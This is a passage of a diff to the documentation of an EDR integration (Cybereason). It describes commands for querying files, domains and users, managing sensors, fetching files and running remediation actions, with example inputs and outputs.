-<h5>Base Command</h5>
-<p><code>cybereason-query-file</code></p>
-<h5>Input</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 202px;"><strong>Argument Name</strong></th>
-<th style="width: 424px;"><strong>Description</strong></th>
-<th style="width: 114px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 202px;">file_hash</td>
-<td style="width: 424px;">File hash (SHA-1 and MD5 supported)</td>
-<td style="width: 114px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 233px;"><strong>Path</strong></th>
-<th style="width: 64px;"><strong>Type</strong></th>
-<th style="width: 443px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 233px;">Cybereason.File.Path</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File path</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.SHA1</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File SHA-1 hash</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.Machine</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">Machine name on which file is located</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.SuspicionsCount</td>
-<td style="width: 64px;">number</td>
-<td style="width: 443px;">File suspicions count</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.Name</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File name</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.CreationTime</td>
-<td style="width: 64px;">date</td>
-<td style="width: 443px;">File creation time</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.Suspicion</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File suspicions object of suspicion as key and detected date as value</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.OSVersion</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">Machine OS version on which the file is located</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.ModifiedTime</td>
-<td style="width: 64px;">date</td>
-<td style="width: 443px;">File modified date</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.Malicious</td>
-<td style="width: 64px;">boolean</td>
-<td style="width: 443px;">Is file malicious</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.Company</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">Company name</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.MD5</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File MD5 hash</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.IsConnected</td>
-<td style="width: 64px;">boolean</td>
-<td style="width: 443px;">Is machine connected to Cybereason</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.Signed</td>
-<td style="width: 64px;">boolean</td>
-<td style="width: 443px;">Is file signed</td>
-</tr>
-<tr>
-<td style="width: 233px;">Cybereason.File.Evidence</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File evidences</td>
-</tr>
-<tr>
-<td style="width: 233px;">Endpoint.Hostname</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">Hostname on which file is located</td>
-</tr>
-<tr>
-<td style="width: 233px;">Endpoint.OSVersion</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">Machine OS version on which the file is located</td>
-</tr>
-<tr>
-<td style="width: 233px;">File.Hostname</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">Hostname on which file is located</td>
-</tr>
-<tr>
-<td style="width: 233px;">File.MD5</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File MD5 hash</td>
-</tr>
-<tr>
-<td style="width: 233px;">File.SHA1</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File SHA-1 hash</td>
-</tr>
-<tr>
-<td style="width: 233px;">File.Name</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File name</td>
-</tr>
-<tr>
-<td style="width: 233px;">File.Path</td>
-<td style="width: 64px;">string</td>
-<td style="width: 443px;">File path</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-query-file file_hash=d40a48094c1f21fef892f27a8b6a7ed2bbf0c27f
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>File was unprevented successfully
+
+### cybereason-query-file
+***
+Query files as part of investigation
+
+
+#### Base Command
+
+`cybereason-query-file`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| file_hash | File hash (SHA-1 and MD5 supported). | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.File.Path | string | File path | 
+| Cybereason.File.SHA1 | string | File SHA-1 hash | 
+| Cybereason.File.Machine | string | Machine name on which file is located | 
+| Cybereason.File.SuspicionsCount | number | File suspicions count | 
+| Cybereason.File.Name | string | File name | 
+| Cybereason.File.CreationTime | date | File creation time | 
+| Cybereason.File.Suspicion | string | File suspicions object of suspicion as key and detected date as value | 
+| Cybereason.File.OSVersion | string | Machine OS version on which file is located | 
+| Cybereason.File.ModifiedTime | date | File modified date | 
+| Cybereason.File.Malicious | boolean | Is file malicious | 
+| Cybereason.File.Company | string | Company name | 
+| Cybereason.File.MD5 | string | File MD5 hash | 
+| Cybereason.File.IsConnected | boolean | Is machine connected to Cybereason | 
+| Cybereason.File.Signed | boolean | Is file signed | 
+| Cybereason.File.Evidence | string | File evidences | 
+
+#### Command example
+```!cybereason-query-file file_hash=<file_hash>```
+#### Context Example
+```json
+{
     "Cybereason": {
-        "File": [
-        {
-            "Company": "company",
-            "CreationTime": "2018-09-25T20:10:38.000Z",
-            "Evidence": [
-                "mimikatzResourceEvidence",
-                "reportedByAntiMalwareEvidence",
-                "malwareClassificationEvidence",
-                "hasLegitClassificationEvidence",
-                "hasNonLegitClassificationEvidence",
-                "whitelistClassificationEvidence"
-            ],
+        "File": {
+            "Company": "Alexander Roshal",
+            "CreationTime": "2022-02-28T07:03:48.000Z",
+            "Evidence": [],
             "IsConnected": false,
-            "MD5": "b5962945811f8d275a3a69334dbc81e8",
-            "Machine": "DESKTOP-UNQ8LCD",
+            "MD5": "fc61fdcad5a9d52a01bd2d596f2c92b9",
+            "Machine": "desktop-vg9ke2u",
             "Malicious": false,
-            "ModifiedTime": "2018-11-14T20:02:34.000Z",
-            "Name": "mimikatz.exe",
-            "OSVersion": "Windows_10",
-            "Path": "c:\\users\\user\\downloads\\mimikatz_trunk\\x64\\mimikatz.exe",
-            "SHA1": "d40a48094c1f21fef892f27a8b6a7ed2bbf0c27f",
+            "ModifiedTime": "2022-05-09T16:21:18.000Z",
+            "Name": "<file_name>",
+            "OSVersion": null,
+            "Path": "c:\\users\\prase\\downloads\\winrar-x64-602.pdf.exe",
+            "SHA1": "77ab1e20c685e716b82c7c90b373316fc84cde23",
             "Signed": true,
-            "Suspicion": {
-                "fileReputationSuspicion": "2018-11-14T20:02:52.000Z",
-                "mimikatzSuspicion": "2018-11-14T20:02:52.000Z",
-                "reportedByAntiMalwareSuspicion": "2018-11-27T20:56:54.000Z"
-            },
-            "SuspicionsCount": 3
+            "Suspicion": {},
+            "SuspicionsCount": null
         }
-    ]
-    },
-    "Endpoint": [
-        {
-            "Hostname": "DESKTOP-UNQ8LCD",
-            "OSVersion": "Windows_10"
-        }
-    ],
-    "File": [
-        {
-            "Hostname": "DESKTOP-UNQ8LCD",
-            "MD5": "b5962945811f8d275a3a69334dbc81e8",
-            "Name": "mimikatz.exe",
-            "Path": "c:\\users\\user\\downloads\\mimikatz_trunk\\x64\\mimikatz.exe",
-            "SHA1": "d40a48094c1f21fef892f27a8b6a7ed2bbf0c27f"
-        }
-    ]
+    }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><a href="https://user-images.githubusercontent.com/31018228/50557121-9b5db100-0cea-11e9-9d81-54e59755018b.png" target="_blank" rel="noopener noreferrer"><img src="https://user-images.githubusercontent.com/31018228/50557121-9b5db100-0cea-11e9-9d81-54e59755018b.png" alt="image"></a></p>
-<h3 id="h_2651126022221546507576262">13. Get information for a domain</h3>
-<hr>
-<p>Query domains as part of investigation.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-query-domain</code></p>
-<h5>Input</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 289px;"><strong>Argument Name</strong></th>
-<th style="width: 284px;"><strong>Description</strong></th>
-<th style="width: 167px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 289px;">domain</td>
-<td style="width: 284px;">Domain to query</td>
-<td style="width: 167px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 437px;"><strong>Path</strong></th>
-<th style="width: 59px;"><strong>Type</strong></th>
-<th style="width: 244px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 437px;">Cybereason.Domain.Name</td>
-<td style="width: 59px;">string</td>
-<td style="width: 244px;">Domain name</td>
-</tr>
-<tr>
-<td style="width: 437px;">Cybereason.Domain.Malicious</td>
-<td style="width: 59px;">boolean</td>
-<td style="width: 244px;">Is domain malicious</td>
-</tr>
-<tr>
-<td style="width: 437px;">Cybereason.Domain.IsInternalDomain</td>
-<td style="width: 59px;">boolean</td>
-<td style="width: 244px;">Is domain internal</td>
-</tr>
-<tr>
-<td style="width: 437px;">Cybereason.Domain.Reputation</td>
-<td style="width: 59px;">string</td>
-<td style="width: 244px;">Domain reputation</td>
-</tr>
-<tr>
-<td style="width: 437px;">Cybereason.Domain.SuspicionsCount</td>
-<td style="width: 59px;">number</td>
-<td style="width: 244px;">Domain suspicions count</td>
-</tr>
-<tr>
-<td style="width: 437px;">Cybereason.Domain.WasEverResolved</td>
-<td style="width: 59px;">boolean</td>
-<td style="width: 244px;">Was domain ever resolved</td>
-</tr>
-<tr>
-<td style="width: 437px;">Cybereason.Domain.WasEverResolvedAsASecondLevelDomain</td>
-<td style="width: 59px;">boolean</td>
-<td style="width: 244px;">Was domain ever resolved as a second-level domain</td>
-</tr>
-<tr>
-<td style="width: 437px;">Domain.Name</td>
-<td style="width: 59px;">string</td>
-<td style="width: 244px;">Domain name</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-query-domain domain=www2.bing.com
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>### Cybereason file query results for the file hash: 77ab1e20c685e716b82c7c90b373316fc84cde23
+>|Company|CreationTime|IsConnected|MD5|Machine|Malicious|ModifiedTime|Name|Path|SHA1|Signed|
+>|---|---|---|---|---|---|---|---|---|---|---|
+>| Alexander Roshal | 2022-02-28T07:03:48.000Z | false | fc61fdcad5a9d52a01bd2d596f2c92b9 | desktop-vg9ke2u | false | 2022-05-09T16:21:18.000Z | winrar-x64-602.pdf.exe | c:\users\prase\downloads\winrar-x64-602.pdf.exe | 77ab1e20c685e716b82c7c90b373316fc84cde23 | true |
+
+### cybereason-query-domain
+***
+Query domains as part of investigation
+
+
+#### Base Command
+
+`cybereason-query-domain`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| domain | Domain to query. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Domain.Name | string | Domain name | 
+| Cybereason.Domain.Malicious | boolean | Is domain malicious | 
+| Cybereason.Domain.IsInternalDomain | boolean | Is domain internal | 
+| Cybereason.Domain.Reputation | string | Domain reputation | 
+| Cybereason.Domain.SuspicionsCount | number | Domain suspicions count | 
+| Cybereason.Domain.WasEverResolved | boolean | Was domain ever resolved | 
+| Cybereason.Domain.WasEverResolvedAsASecondLevelDomain | boolean | Was domain ever resolved as a second level domain |
+#### Command example
+```!cybereason-query-domain domain=www2.bing.com```
+#### Context Example
+```json
+{
     "Cybereason": {
-     "Domain": [
-        {
+        "Domain": {
             "IsInternalDomain": false,
             "Malicious": false,
             "Name": "www2.bing.com",
-            "Reputation": "indifferent",
+            "Reputation": null,
             "SuspicionsCount": 0,
-            "WasEverResolved": true,
+            "WasEverResolved": false,
             "WasEverResolvedAsASecondLevelDomain": true
         }
-    ],
-    "Domain": [
-        {
-            "Name": "www2.bing.com"
-        }
-    ]
-  }
+    }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><a href="https://user-images.githubusercontent.com/31018228/50558033-3bb7d380-0cf3-11e9-9b46-2f37a05419a2.png" target="_blank" rel="noopener noreferrer"><img src="https://user-images.githubusercontent.com/31018228/50558033-3bb7d380-0cf3-11e9-9b46-2f37a05419a2.png" alt="image"></a></p>
-<h3 id="h_2362030334611546507584634">14. Get information for a user</h3>
-<hr>
-<p>Query users as part of investigation.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-query-user</code></p>
-<h5>Input</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 274px;"><strong>Argument Name</strong></th>
-<th style="width: 308px;"><strong>Description</strong></th>
-<th style="width: 158px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 274px;">username</td>
-<td style="width: 308px;">Username to query</td>
-<td style="width: 158px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 748px;">
-<thead>
-<tr>
-<th style="width: 347px;"><strong>Path</strong></th>
-<th style="width: 75px;"><strong>Type</strong></th>
-<th style="width: 318px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 347px;">Cybereason.User.Username</td>
-<td style="width: 75px;">string</td>
-<td style="width: 318px;">User name</td>
-</tr>
-<tr>
-<td style="width: 347px;">Cybereason.User.Domain</td>
-<td style="width: 75px;">string</td>
-<td style="width: 318px;">User domain</td>
-</tr>
-<tr>
-<td style="width: 347px;">Cybereason.User.LastMachineLoggedInTo</td>
-<td style="width: 75px;">string</td>
-<td style="width: 318px;">Last machine the user logged in to</td>
-</tr>
-<tr>
-<td style="width: 347px;">Cybereason.User.LocalSystem</td>
-<td style="width: 75px;">boolean</td>
-<td style="width: 318px;">Is local system</td>
-</tr>
-<tr>
-<td style="width: 347px;">Cybereason.User.Organization</td>
-<td style="width: 75px;">string</td>
-<td style="width: 318px;">User organization</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-query-user username="ec2amaz-5man2hc\\network service"
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>### Cybereason domain query results for the domain: www2.bing.com
+>|Name|Reputation|IsInternalDomain|WasEverResolved|WasEverResolvedAsASecondLevelDomain|Malicious|SuspicionsCount|
+>|---|---|---|---|---|---|---|
+>| www2.bing.com | indifferent | false | false | true | false | 0 |
+>| www2.bing.com |  | false | false | true | false | 0 |
+
+### cybereason-query-user
+***
+Query users as part of investigation
+
+
+#### Base Command
+
+`cybereason-query-user`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| username | Username to query. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.User.Username | string | User name | 
+| Cybereason.User.Domain | string | User domain | 
+| Cybereason.User.LastMachineLoggedInTo | string | Last machine which user logged in to | 
+| Cybereason.User.LocalSystem | boolean | Is local system | 
+| Cybereason.User.Organization | string | User organization | 
+
+#### Command example
+```!cybereason-query-user username="desktop-vg9ke2u\\prase"```
+#### Context Example
+```json
+{
     "Cybereason": {
-     "User": [
-        {
-            "Domain": "ec2amaz-5man2hc",
-            "LastMachineLoggedInTo": "EC2AMAZ-5MAN2HC",
-            "LocalSystem": true,
+        "User": {
+            "Domain": "desktop-vg9ke2u",
+            "LastMachineLoggedInTo": "desktop-vg9ke2u",
+            "LocalSystem": false,
             "Organization": "INTEGRATION",
-            "Username": "ec2amaz-5man2hc\\network service"
+            "Username": "desktop-vg9ke2u\\prase"
         }
-    ]
-  }
+    }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><a href="https://user-images.githubusercontent.com/31018228/50557070-3a35dd80-0cea-11e9-954d-56c9978d50fa.png" target="_blank" rel="noopener noreferrer"><img src="https://user-images.githubusercontent.com/31018228/50557070-3a35dd80-0cea-11e9-954d-56c9978d50fa.png" alt="image"></a></p>
+```
+
+#### Human Readable Output
+
+>### Cybereason user query results for the username: desktop-vg9ke2u\prase
+>|Username|Domain|LastMachineLoggedInTo|Organization|LocalSystem|
+>|---|---|---|---|---|
+>| desktop-vg9ke2u\prase | desktop-vg9ke2u | desktop-vg9ke2u | INTEGRATION | false |
+
+### cybereason-archive-sensor
+***
+Archives a Sensor.
+
+
+#### Base Command
+
+`cybereason-archive-sensor`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| sensorID | Sensor ID of Cybereason Sensor. | Required | 
+| archiveReason | Reason for Archiving Cybereason Sensor. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-archive-sensor sensorID=5e77883de4b0575ddcf824ef:PYLUMCLIENT_INTEGRATION_EC2AMAZ-4CTUN1V_123CC99CA7E5 archiveReason="Archive this Sensor"```
+#### Human Readable Output
+
+>Sensor archive status: Failed Actions: 0. Succeeded Actions: 1
+
+### cybereason-unarchive-sensor
+***
+Unarchives a Sensor.
+
+
+#### Base Command
+
+`cybereason-unarchive-sensor`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| sensorID | Sensor ID of Cybereason Sensor. | Required | 
+| unarchiveReason | Reason for Unarchiving Cybereason Sensor. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-unarchive-sensor sensorID=5e77883de4b0575ddcf824ef:PYLUMCLIENT_INTEGRATION_EC2AMAZ-4CTUN1V_123CC99CA7E5 unarchiveReason="Unarchive this Sensor"```
+#### Human Readable Output
+
+>Sensor unarchive status: Failed Actions: 0. Succeeded Actions: 1
+
+### cybereason-delete-sensor
+***
+Deletes a Sensor.
+
+
+#### Base Command
+
+`cybereason-delete-sensor`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| sensorID | Sensor ID of Cybereason Sensor. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-delete-sensor sensorID=5e77883de4b0575ddcf824ef:PYLUMCLIENT_INTEGRATION_EC2AMAZ-4CTUN1V_123CC99CA7E5```
+#### Human Readable Output
+
+>Sensor deleted successfully.
+
+### cybereason-start-fetchfile
+***
+Start fetching the file to download
+
+
+#### Base Command
+
+`cybereason-start-fetchfile`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGUID | Malop GUID for fetching a file from a sensor to download. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-start-fetchfile malopGUID=<malop_id> userName=<user_name>```
+#### Human Readable Output
+
+>Successfully started fetching file for the given malop
+
+### cybereason-fetchfile-progress
+***
+Return a batch id for files waiting for download
+
+
+#### Base Command
+
+`cybereason-fetchfile-progress`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | Malop GUID to know the progress for downloading a file. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Download.Progress.fileName | unknown | Filename for tha given malop | 
+| Cybereason.Download.Progress.status | unknown | Status for batch ID | 
+| Cybereason.Download.Progress.batchID | unknown | Unique batch id | 
+
+#### Command example
+```!cybereason-fetchfile-progress malopGuid=<malop_id>```
+#### Context Example
+```json
+{
+    "Download": {
+        "progress": {
+            "MalopID": "11.-7780537507363356527",
+            "batchID": [
+                -796720096
+            ],
+            "fileName": [
+                "<file_name>"
+            ],
+            "status": [
+                true
+            ]
+        }
+    }
+}
+```
+
+#### Human Readable Output
+
+>Filename: ['winrar-x64-602.pdf.exe'] Status: [True] Batch ID: [-796720096]
+
+### cybereason-download-file
+***
+Downloads the actual file to the machine
+
+
+#### Base Command
+
+`cybereason-download-file`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| batchID | The batch id for the file download operation. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-download-file batchID=-1044817479```
+#### Context Example
+```json
+{
+    "File": {
+        "EntryID": "15836@1282f695-fa2d-4fdd-8c2a-965a7722044b",
+        "Extension": "zip",
+        "Info": "application/zip",
+        "MD5": "753ce5f6014c7cd549f751752978d4cf",
+        "Name": "download.zip",
+        "SHA1": "9d5ef11989f0294929b572fdd4be2aefae94810d",
+        "SHA256": "532fd3122f405471f48077bf0c24bfbd2b6fa13decb9916530b86f2f8802a827",
+        "SHA512": "59a9649736c464546cc582128a2694ec797b34d558b7e845485b7688f6a536d7acac3bf5912b0725a77c02177445ec90da9982d955e5d393ff40af7109586e3b",
+        "SSDeep": "<SSDeep_value>",
+        "Size": 3168792,
+        "Type": "Zip archive data, at least v2.0 to extract"
+    }
+}
+```
+
+#### Human Readable Output
+
+>Integration log: Downloading the file with this Batch ID: -1044817479
+
+### cybereason-close-file-batch-id
+***
+Aborts a file download operation that is in progress
+
+
+#### Base Command
+
+`cybereason-close-file-batch-id`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| batchID | The batch id to abort a file download operation. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+
+#### Command example
+```!cybereason-close-file-batch-id batchID=-796720096```
+#### Human Readable Output
+
+>Successfully aborts a file download operation that is in progress.
+
+### cybereason-available-remediation-actions
+***
+Get all remediation action details whatever available for that malop
+
+
+#### Base Command
+
+`cybereason-available-remediation-actions`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-available-remediation-actions malopGuid=<malop_id>```
+#### Human Readable Output
+
+>```
+>{
+>    "data": [
+>        {
+>            "machineConnected": false,
+>            "machineId": "-1845090846.1198775089551518743",
+>            "machineName": "desktop-vg9ke2u",
+>            "machinesCount": 1,
+>            "malopId": "11.-7780537507363356527",
+>            "malopType": "MalopProcess",
+>            "remediationType": "BLOCK_FILE",
+>            "targetId": "-1845090846.-1424333057657783286",
+>            "targetName": "fc61fdcad5a9d52a01bd2d596f2c92b9",
+>            "uniqueId": "BLOCK_FILE::-1845090846.-1424333057657783286"
+>        },
+>        {
+>            "machineConnected": false,
+>            "machineId": "-1845090846.1198775089551518743",
+>            "machineName": "desktop-vg9ke2u",
+>            "machinesCount": 1,
+>            "malopId": "11.-7780537507363356527",
+>            "malopType": "MalopProcess",
+>            "remediationType": "UNQUARANTINE_FILE",
+>            "targetId": "-1845090846.-4034595808369608762",
+>            "targetName": "<target_name>",
+>            "uniqueId": "UNQUARANTINE_FILE::-1845090846.-4034595808369608762"
+>        }
+>    ],
+>    "errorMessage": "",
+>    "status": "SUCCESS"
+>}
+>```
+
+### cybereason-kill-process
+***
+Kill a processes for the malicious file. (User will get inputs by executing the 'cybereason-available-remediation-actions' command if this remediation action is available for that Malop)
+
+
+#### Base Command
+
+`cybereason-kill-process`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+| machine | Machine name to kill the process. | Required | 
+| targetId | Target ID to kill the process. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+| comment | Comment to add to the malop. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-kill-process machine=desktop-vg9ke2u malopGuid=<malop_id> targetId=<target_id> userName=<user_name> comment="Kill the Process"```
+#### Human Readable Output
+
+>Kill process remediation action status is: SUCCESS
+>Remediation ID: 3dc597e8-d829-47ea-b7e6-79d872769916
+
+### cybereason-quarantine-file
+***
+Quarantine the detected malicious file in a secure location. (User will get inputs by executing the 'cybereason-available-remediation-actions' command if this remediation action is available for that Malop)
+
+
+#### Base Command
+
+`cybereason-quarantine-file`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+| machine | Machine name to quarantine a file. | Required | 
+| targetId | Target ID to quarantine a file. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+| comment | Comment to add to the malop. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-quarantine-file machine=desktop-vg9ke2u malopGuid=<malop_id> targetId=<target_id> userName=<user_name> comment="Quarantine the File"```
+#### Human Readable Output
+
+>Quarantine file remediation action status is: SUCCESS
+>Remediation ID: 566b57ac-de77-4128-92d7-3dd0b504ecfb
+
+### cybereason-unquarantine-file
+***
+Unquarantine the detected malicious file in a secure location. (User will get inputs by executing the 'cybereason-available-remediation-actions' command if this remediation action is available for that Malop)
+
+
+#### Base Command
+
+`cybereason-unquarantine-file`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+| machine | Machine name to unquarantine a file. | Required | 
+| targetId | Target ID to unquarantine a file. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+| comment | Comment to add to the malop. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-unquarantine-file machine=desktop-vg9ke2u malopGuid=<malop_id> targetId=<target_id> userName=<user_name> comment="Unquarantine the File"```
+#### Human Readable Output
+
+>Unquarantine file remediation action status is: SUCCESS
+>Remediation ID: 47146e65-320c-4663-905d-c2b561459933
+
+### cybereason-block-file
+***
+Block a file only in particular machine. (User will get inputs by executing the 'cybereason-available-remediation-actions' command if this remediation action is available for that Malop)
+
+
+#### Base Command
+
+`cybereason-block-file`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+| machine | Machine name whose files needs to be blocked. | Required | 
+| targetId | Target ID of file to be blocked. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+| comment | Comment to add to the malop. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-block-file machine=desktop-vg9ke2u malopGuid=<malop_id> targetId=<target_id> userName=<user_name> comment="Block a File"```
+#### Human Readable Output
+
+>Block file remediation action status is: SUCCESS
+>Remediation ID: 51a3e113-1346-4189-89fe-5981ed2cbd5c
+
+### cybereason-delete-registry-key
+***
+Delete a registry entry associated with a malicious process. (User will get inputs by executing the 'cybereason-available-remediation-actions' command if this remediation action is available for that Malop)
+
+
+#### Base Command
+
+`cybereason-delete-registry-key`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+| machine | Machine name to delete the registry key. | Required | 
+| targetId | Target ID to delete the registry key. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+| comment | Comment to add to the malop. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-delete-registry-key machine=desktop-vg9ke2u malopGuid=<malop_id> targetId=<target_id> userName=<user_name> comment="Remove the registry key"```
+#### Human Readable Output
+
+>Delete registry key remediation action status is: SUCCESS
+>Remediation ID: 6beda94f-d331-4f60-aa84-790fbdc5aab4
+
+### cybereason-kill-prevent-unsuspend
+***
+Prevent detected ransomware from running on the machine. (User will get inputs by executing the 'cybereason-available-remediation-actions' command if this remediation action is available for that Malop)
+
+
+#### Base Command
+
+`cybereason-kill-prevent-unsuspend`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+| machine | Machine name to prevent detected ransomware from running on the machine. | Required | 
+| targetId | Target ID to prevent detected ransomware from running on the machine. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+| comment | Comment to add to the malop. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-kill-prevent-unsuspend machine=desktop-vg9ke2u malopGuid=<malop_id> targetId=<target_id> userName=<user_name> comment="Kill Prevent"```
+#### Human Readable Output
+
+>Kill prevent unsuspend remediation action status is: SUCCESS
+>Remediation ID: 6f951d29-2516-47c8-9fb9-d82f11771496
+
+### cybereason-unsuspend-process
+***
+Prevent a file associated with ransomware. (User will get inputs by executing the 'cybereason-available-remediation-actions' command if this remediation action is available for that Malop)
+
+
+#### Base Command
+
+`cybereason-unsuspend-process`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | The unique ID assigned by the Cybereason platform for the Malop. | Required | 
+| machine | Machine name to prevent a file associated with ransomware. | Required | 
+| targetId | Target ID to prevent a file associated with ransomware. | Required | 
+| userName | The complete Cybereason user name string for the user performing the request. | Required | 
+| comment | Comment to add to the malop. | Optional | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
